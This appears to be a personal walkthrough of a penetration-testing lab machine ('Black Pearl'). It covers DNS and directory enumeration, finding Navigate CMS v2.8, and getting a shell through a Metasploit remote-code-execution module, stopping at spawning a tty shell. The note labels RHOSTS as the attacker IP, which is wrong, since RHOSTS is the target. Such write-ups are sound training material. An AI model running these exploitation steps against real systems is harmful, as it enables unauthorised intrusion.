80 - 10.0.2.154 - 15/02/2024
Default Nginx page

Directory busting with [[cheet#ffuf]]  + [[cheet#Nikto]] + [[cheet#dirb]]
We found a /secret
/secret contains a file -->  that tells that here we con't find anything

53 - 10.0.2.154:

### Enumerating DNS
We'll use [[cheet#dnsrecon]] to gather some info about the victim host
![[Pasted image 20240216094823.png]]
as you can see -->  we have found a <span style="color:#00b050">DNS POINTER record</span>:
                 record that maps an IP address to the domain name. 
                 It’s often called a "reverse DNS entry"

How can we visit this domain name:
we add inside our /etc/hosts file -->  1 line with the victim ip + the domain
![[Pasted image 20240216095524.png]]

now:
- close your browser
- try to connect http://blackpearl.tcm
- we find a php page
- nothing interesting

but:
we can do directory bursting again on http://blackpearl.tcm

### ffuf
`ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ_VARIABLE -u http://blackpearl.tcm/FUZZ_VARIABLE`

we found 1 subdirectory -->  navigate
=>
let's connect to http://blackpearl.tcm/navigate
=>
we'll find a NAVIGATE CMS login page
in the bottom-right corner we can see the version -->  navigate cms v2.8
=>
search on google for -->  - navigate cms default credentials 
				     - [navigate cms exploit](https://www.rapid7.com/db/modules/exploit/multi/http/navigate_cms_rce/)

We have found an exploit for -->   <span style="color:#00b050">Unauthenticated Remote Code Execution</span> 
								 (using metasploit)

## Metasploit
`msfconsole`
`use exploit/multi/http/navigate_cms_rce`
`options`
`set RHOSTS 10.0.2.15 `        attacker ip
`set VHOST blackpearl.tcm`
`run`

=>
<span style="color:#00b050">we have a shell</span><span style="color:#00b050">!</span> 
type `shell`
> [!WARNING] 
> We don't have a normal shell:
> - it is anyway a shell that works  (try to write command whoami for example)
> - but it's difficult to read
> =>
> we need to spawn a tty shell

## Spawn a tty shell
Search on google for -->  [spawning a tty shell](https://wiki.zacheller.dev/pentest/privilege-escalation/spawning-a-tty-shell)
